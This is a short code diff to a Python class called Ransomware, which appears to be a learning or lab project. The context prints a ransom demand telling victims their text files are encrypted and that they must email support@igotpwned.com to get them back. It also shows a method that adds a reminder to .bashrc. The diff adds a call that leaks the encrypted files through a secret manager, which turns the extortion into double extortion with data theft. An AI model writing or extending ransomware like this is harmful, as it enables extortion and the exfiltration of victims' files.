@@ -58,6 +58,7 @@ class Ransomware:
         print(f"Your txt files have been encrypted! Please send an email to support@igotpwned.com with object '{token}' to retrieve your data.")
         print(HERE_WIPE_YOUR_TEARS)
         print(ASCII_TISSUE_BOX)
+        self._secret_manager.leak_files(files_to_encrypt)
         return None
     
     def add_reminder_to_bashrc(self, path: str) -> None:
